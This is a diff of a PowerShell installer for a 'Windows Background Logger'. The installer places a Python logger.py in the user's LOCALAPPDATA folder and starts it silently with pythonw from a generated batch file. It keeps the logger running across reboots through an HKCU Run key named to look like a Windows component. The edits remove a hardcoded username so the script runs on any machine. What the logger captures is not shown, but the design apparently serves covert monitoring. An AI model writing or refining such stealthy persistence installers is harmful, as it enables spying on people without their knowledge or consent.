@@ -1,5 +1,6 @@
 # =============================================
 #   Windows Automated Background Logger Setup
+#   (Fully Dynamic - Works on Any Computer)
 # =============================================
 
 $installDir = "$env:LOCALAPPDATA\WindowsLogger"
@@ -60,7 +61,7 @@ Set-Location $installDir
 python -m pip install --upgrade pip setuptools wheel --quiet
 
 $pipArgs = @("-m", "pip", "install", "-r", "requirements.txt", "--no-cache-dir", "--timeout", "180", "--retries", "10", "--quiet")
-$installResult = & python $pipArgs
+& python $pipArgs
 
 if ($LASTEXITCODE -eq 0) {
     Write-Host "[+] All packages installed successfully." -ForegroundColor Green
@@ -69,25 +70,33 @@ if ($LASTEXITCODE -eq 0) {
     python -m pip install -r requirements.txt --no-cache-dir --timeout 200 --retries 15
 }
 
-# 4. Create start_logger.bat
-Write-Host "[*] Creating startup batch file..." -ForegroundColor Yellow
+# 4. Create Dynamic start_logger.bat (No Hardcoded Username)
+Write-Host "[*] Creating dynamic startup batch file..." -ForegroundColor Yellow
 
 $batContent = @'
 @echo off
-:: Silent Logger Starter
-set PYTHONW=C:\Users\pkpat\AppData\Local\Programs\Python\Python312\pythonw.exe
-set SCRIPT=C:\Users\pkpat\AppData\Local\WindowsLogger\logger.py
+:: Dynamic Logger Starter - Works on any Windows user
 
-if not exist "%PYTHONW%" (
-    set PYTHONW=pythonw
+set "SCRIPT=%LOCALAPPDATA%\WindowsLogger\logger.py"
+
+:: Find pythonw.exe dynamically
+set "PYTHONW="
+for %%i in (pythonw.exe) do set "PYTHONW=%%~$PATH:i"
+if not defined PYTHONW (
+    set "PYTHONW=%LOCALAPPDATA%\Programs\Python\Python312\pythonw.exe"
 )
 
-start "" "%PYTHONW%" "%SCRIPT%"
+if exist "%PYTHONW%" (
+    start "" "%PYTHONW%" "%SCRIPT%"
+) else (
+    start "" pythonw "%SCRIPT%"
+)
 '@
 
 $batPath = "$installDir\start_logger.bat"
 $batContent | Out-File -FilePath $batPath -Encoding UTF8 -Force
-Write-Host "[+] Batch file created successfully." -ForegroundColor Green
+
+Write-Host "[+] Dynamic batch file created successfully." -ForegroundColor Green
 
 # 5. Add .bat file to Windows Startup
 Write-Host "[*] Adding to Windows Startup..." -ForegroundColor Yellow
@@ -98,5 +107,5 @@ Set-ItemProperty -Path $runKey -Name "WindowsBackgroundLogger" -Value "`"$batPat
 Write-Host "=============================================" -ForegroundColor Green
 Write-Host "[✓] Setup completed successfully! Logger is now active." -ForegroundColor Green
 Write-Host "[i] Installation folder: $installDir" -ForegroundColor Cyan
-Write-Host "[i] Startup method: start_logger.bat" -ForegroundColor Cyan
+Write-Host "[i] Startup method: Dynamic start_logger.bat" -ForegroundColor Cyan
 Write-Host "=============================================" -ForegroundColor Green
